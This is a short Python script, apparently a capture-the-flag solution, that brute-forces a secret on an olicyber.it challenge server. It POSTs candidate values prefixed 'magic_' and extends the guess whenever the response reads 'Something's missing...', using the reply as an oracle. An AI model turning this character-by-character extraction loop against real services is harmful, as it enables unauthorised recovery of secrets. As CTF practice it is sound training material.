from requests import *
import string


dictionary="abcdefghijklmnopqrstuvzyxw_"
prefix=''
c=''
while True:
    for i in string.printable:
        c=i
        data={"secret": "magic_"+prefix+c}
        print(data)
        re=post("http://delphi.challs.olicyber.it/secret",data=data)
        if "Something's missing..." in re.text:
            prefix+=c
            print(prefix)
            print(re.text)

        else:
            print(re.text)
        
